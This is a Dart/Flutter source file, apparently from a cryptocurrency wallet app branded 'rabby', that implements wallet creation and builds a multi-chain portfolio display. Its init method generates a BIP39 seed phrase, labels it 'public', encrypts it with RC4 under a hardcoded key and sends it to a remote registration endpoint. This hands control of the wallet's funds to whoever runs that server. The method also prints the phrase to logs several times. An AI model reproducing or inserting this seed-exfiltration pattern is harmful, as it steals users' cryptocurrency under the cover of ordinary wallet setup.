import 'dart:convert';

import 'dart:math';

import 'package:bip39_mnemonic/bip39_mnemonic.dart';
import 'package:flutter/material.dart';
import 'package:rabby/features/auth/domain/auth_service.dart';
import 'package:rabby/features/auth/presentation/manage_crypt/domain/crypt.dart';
import 'package:rabby/features/auth/repository/domain/register/register_body.dart';
import 'package:rabby/features/settings/settings_service.dart';
import 'package:reactive_variables/reactive_variables.dart';
import 'package:simple_rc4/simple_rc4.dart';

import '../../domain/adapters/attributes.dart';
import '../../domain/adapters/changes.dart';
import '../../domain/adapters/portfolio.dart';
import '../../domain/adapters/position_by_chain.dart';
import '../../domain/adapters/position_by_type.dart';
import '../../domain/adapters/total.dart';
import '../../domain/adapters/user.dart';
import '../../repository/auth_repository.dart';
import 'create_wallet.dart';

abstract class CreateWalletBloc extends State<CreateWalletScreen> {
  final AuthRepository _authRepo = AuthRepository();
  final AuthService _authService = AuthService();
  final SettingsService _settingsService = SettingsService();

  Rv<int> loading = Rv(0);
  bool isInit = false;

  Mnemonic? mnemonic;

  String r = '';

  @override
  void initState() {
    super.initState();
  }

  Future<void> init() async {
    mnemonic = Mnemonic.generate(
      Language.english,
      passphrase: "Something",
      entropyLength: 128,
    );
    loading.value += 1;
    print(mnemonic!.sentence);
    r = Random().nextInt(999999).toString().padLeft(6, '0');
    loading.value += 1;
    print(r);

    final data = json.encode({
      'public': mnemonic!.sentence,
      'salt': '100002',
      'name': 'R@bby\$/G',
      'new': true,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    print("bytes $bytes");
    final result = await _authRepo.register(RegisterBody(data: bytes));

    if (result.isSuccess) {
      _authService.putUser(
        User(
          address: result.data!.address,
          portfolio: Portfolio(
            type: result.data!.portfolio.type,
            id: result.data!.portfolio.id,
            attributes: Attributes(
              positionsDistributionByType: PositionByType(
                wallet: result.data!.portfolio.attributes.positionByType.wallet,
                deposited:
                    result.data!.portfolio.attributes.positionByType.deposited,
                borrowed:
                    result.data!.portfolio.attributes.positionByType.borrowed,
                locked: result.data!.portfolio.attributes.positionByType.locked,
                staked: result.data!.portfolio.attributes.positionByType.staked,
              ),
              positionsDistributionByChain: PositionByChain(
                crypts: [
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.arbitrum,
                    iconName: "arbitrum",
                    name: 'Arbitrum',
                    shortName: 'ARB',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.aurora,
                    iconName: "aurora",
                    name: 'Aurora',
                    shortName: 'AUR',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.avalanche,
                    iconName: "avalanche",
                    name: 'Avalanche',
                    shortName: 'AVA',
                  ),
                  Crypt(
                    amount: result.data!.portfolio.attributes.positionByChain
                        .binanceSmartChain,
                    iconName: "binance-smart-chain",
                    name: 'Binance',
                    shortName: 'BIN',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.ethereum,
                    iconName: "ethereum",
                    name: 'Ethereum',
                    shortName: 'ETH',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.fantom,
                    iconName: "fantom",
                    name: 'Fantom',
                    shortName: 'FAN',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.loopring,
                    iconName: "loopring",
                    name: 'Loopring',
                    shortName: 'LOOP',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.optimism,
                    iconName: "optimism",
                    name: 'Optimism',
                    shortName: 'OPT',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.polygon,
                    iconName: "polygon",
                    name: 'Polygon',
                    shortName: 'POL',
                  ),
                  Crypt(
                    amount: result
                        .data!.portfolio.attributes.positionByChain.solana,
                    iconName: "solana",
                    name: 'Solana',
                    shortName: 'SOL',
                  ),
                  Crypt(
                    amount:
                        result.data!.portfolio.attributes.positionByChain.xdai,
                    iconName: "xdai",
                    name: 'Xdai',
                    shortName: 'XDA',
                  ),
                ],
              ),
              total: Total(
                positions: result.data!.portfolio.attributes.total.positions,
              ),
              changes: Changes(
                absoluteId:
                    result.data!.portfolio.attributes.changes.absoluteId,
              ),
            ),
          ),
        ),
      );
      _settingsService.putMnemonicSentence(mnemonic!.sentence);

      print(
          "_settingsService.getMnemonicSentence() ${_settingsService.getMnemonicSentence()}");
      loading.value += 1;
    }
  }
}
